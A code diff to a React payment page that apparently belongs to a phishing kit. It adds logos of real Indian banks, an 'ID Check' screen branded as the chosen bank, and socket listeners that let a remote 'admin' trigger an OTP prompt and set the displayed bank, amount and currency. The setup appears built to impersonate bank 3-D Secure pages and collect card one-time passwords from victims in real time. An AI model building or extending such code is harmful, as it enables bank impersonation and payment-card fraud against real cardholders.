@@ -15,6 +15,42 @@ const Payment = () => {
   const [isProcessing, setIsProcessing] = useState(true);
   const [error, setError] = useState('');
   const [success, setSuccess] = useState(false);
+  const [customAmount, setCustomAmount] = useState<number | null>(null);
+  const [currency, setCurrency] = useState('INR');
+  const [currencySymbol, setCurrencySymbol] = useState('₹');
+  const [bankLogo, setBankLogo] = useState('');
+  const [selectedBankName, setSelectedBankName] = useState('HDFC BANK');
+  
+  // Add debugging state
+  const [debugInfo, setDebugInfo] = useState('No socket events received yet');
+
+  // Bank logos data structure - MUST match Admin panel exactly
+  const bankLogos = [
+    { name: 'HDFC Bank', logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png' },
+    { name: 'State Bank of India', logo: 'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp' },
+    { name: 'ICICI Bank', logo: 'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png' },
+    { name: 'Axis Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png' },
+    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png' },
+    { name: 'Punjab National Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png' },
+    { name: 'Kotak Mahindra Bank', logo: 'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg' },
+    { name: 'Bank of India', logo: 'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png' }
+  ];
+
+  // Function to get bank name from logo URL
+  const getBankNameFromLogo = (logoUrl: string): string => {
+    console.log('🔍 getBankNameFromLogo called with:', logoUrl);
+    const bank = bankLogos.find(bank => bank.logo === logoUrl);
+    console.log('🔍 Found bank:', bank);
+    
+    if (!bank) {
+      console.log('⚠️ No bank found for logo URL. Available logos:');
+      bankLogos.forEach((b, index) => {
+        console.log(`${index + 1}. ${b.name}: ${b.logo}`);
+      });
+    }
+    
+    return bank ? bank.name.toUpperCase() : 'HDFC BANK';
+  };
 
   const planData = location.state?.planData;
 
@@ -39,15 +75,87 @@ const Payment = () => {
     setSocket(newSocket);
 
     newSocket.on('connect', () => {
-      console.log('Connected to WebSocket server');
+      console.log('🟢 Payment page connected to WebSocket server');
+      console.log('🆔 Socket ID:', newSocket.id);
+      console.log('🌐 Socket URL:', socketUrl);
+      
+      // Send a test ping to verify connection
+      newSocket.emit('payment-page-connected', { 
+        timestamp: Date.now(),
+        page: 'payment',
+        socketId: newSocket.id
+      });
+      
+      console.log('✅ Payment page ready to receive events');
     });
 
-    newSocket.on('show-otp', () => {
-      console.log('Admin requested OTP');
+    newSocket.on('disconnect', () => {
+      console.log('Payment page disconnected from WebSocket server');
+    });
+
+    // Listen for both event types to ensure delivery
+    const handleShowOtp = (data: any) => {
+      console.log('🎯 RECEIVED show-otp event in Payment page:', data);
+      console.log('🔍 Full event data:', JSON.stringify(data, null, 2));
+      setDebugInfo(`Event received: ${JSON.stringify(data)}`);
+      console.log('Setting showOtp to true...');
       setShowOtp(true);
       setIsProcessing(false); // Stop loading spinner when OTP form appears
       setError('');
+      
+      // Update currency display if custom data is provided
+      if (data && data.customAmount !== undefined) {
+        setCustomAmount(data.customAmount);
+        setCurrency(data.currency || 'INR');
+        setCurrencySymbol(data.currencySymbol || '₹');
+        
+        // IMPORTANT: Set bank logo BEFORE setting bank name
+        const receivedBankLogo = data.bankLogo || '';
+        console.log('🎨 Received bankLogo from admin:', receivedBankLogo);
+        setBankLogo(receivedBankLogo);
+        setDebugInfo(`Bank logo set to: ${receivedBankLogo}`);
+        
+        // Set the selected bank name based on the logo URL
+        if (receivedBankLogo) {
+          const bankName = getBankNameFromLogo(receivedBankLogo);
+          setSelectedBankName(bankName);
+          console.log('🏛️ Mapped bank name:', bankName);
+          console.log('📋 Bank logos array:', bankLogos.map(b => ({ name: b.name, logo: b.logo })));
+          setDebugInfo(`Bank: ${bankName}, Logo: ${receivedBankLogo}`);
+        } else {
+          console.log('⚠️ No bankLogo received, using default');
+          setSelectedBankName('HDFC BANK');
+          setDebugInfo('No bank logo received, using default HDFC');
+        }
+        
+        console.log('Updated currency display:', {
+          amount: data.customAmount,
+          currency: data.currency,
+          symbol: data.currencySymbol,
+          bankLogo: data.bankLogo,
+          bankName: data.bankLogo ? getBankNameFromLogo(data.bankLogo) : 'HDFC BANK'
+        });
+      } else {
+        // Reset to defaults if no custom data
+        setCustomAmount(null);
+        setCurrency('INR');
+        setCurrencySymbol('₹');
+        setBankLogo('');
+        setSelectedBankName('HDFC BANK');
+      }
+    };
+    
+    // Register ALL possible event listeners to ensure we catch the event
+    newSocket.on('show-otp', handleShowOtp);
+    newSocket.on('admin-show-otp', handleShowOtp);
+    newSocket.on('broadcast-show-otp', handleShowOtp);
+    
+    // Test event listener to verify socket is working
+    newSocket.on('test-event', (data) => {
+      console.log('🧪 Test event received:', data);
     });
+    
+    console.log('🔌 Registered event listeners: show-otp, admin-show-otp, broadcast-show-otp');
 
     newSocket.on('payment-approved', () => {
       console.log('Payment approved by admin');
@@ -203,16 +311,47 @@ const Payment = () => {
 
                 {/* Header */}
                 <div className="p-6 border-b">
+                  {/* Debug Info */}
+                  <div className="bg-yellow-100 border border-yellow-300 rounded p-2 mb-4 text-xs">
+                    <strong>Debug:</strong> {debugInfo}
+                    <br />
+                    <strong>Bank Logo:</strong> {bankLogo || 'EMPTY'}
+                    <br />
+                    <strong>Bank Name:</strong> {selectedBankName}
+                  </div>
+                  
                   <div className="flex items-center gap-3 mb-4">
-                    <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
-                      <span className="text-white text-xs font-bold">MC</span>
-                    </div>
+                    {(() => {
+                      console.log('🔍 Header Logo Debug:', { bankLogo, selectedBankName });
+                      return null;
+                    })()}
+                    {bankLogo ? (
+                      <div className="w-8 h-8 bg-white rounded flex items-center justify-center border">
+                        <img 
+                          src={bankLogo} 
+                          alt={selectedBankName + ' Logo'} 
+                          className="w-6 h-6 object-contain"
+                          onError={(e) => {
+                            console.log('❌ Bank logo failed to load:', bankLogo);
+                            // Fallback to MC icon if bank logo fails to load
+                            e.currentTarget.parentElement!.innerHTML = '<span class="text-orange-500 text-xs font-bold">MC</span>';
+                          }}
+                          onLoad={() => {
+                            console.log('✅ Bank logo loaded successfully:', bankLogo);
+                          }}
+                        />
+                      </div>
+                    ) : (
+                      <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
+                        <span className="text-white text-xs font-bold">MC</span>
+                      </div>
+                    )}
                     <span className="font-semibold text-gray-800">ID Check</span>
                   </div>
                   
                   <div className="bg-red-600 text-white text-center py-3 rounded flex items-center justify-center gap-2">
                     <span className="text-2xl">🏥</span>
-                    <span className="font-bold text-lg">HDFC BANK</span>
+                    <span className="font-bold text-lg">{selectedBankName}</span>
                   </div>
                 </div>
 
@@ -235,7 +374,13 @@ const Payment = () => {
                     </div>
                     <div className="flex justify-between py-1">
                       <span className="text-gray-600">Amount</span>
-                      <span className="font-medium text-blue-600">₹{planData.price?.toLocaleString()}.00</span>
+                      <span className="font-medium text-blue-600">
+                        {customAmount !== null ? (
+                          `${currencySymbol}${customAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+                        ) : (
+                          `₹${planData.price?.toLocaleString()}.00`
+                        )}
+                      </span>
                     </div>
                     <div className="flex justify-between py-1">
                       <span className="text-gray-600">Personal Message</span>
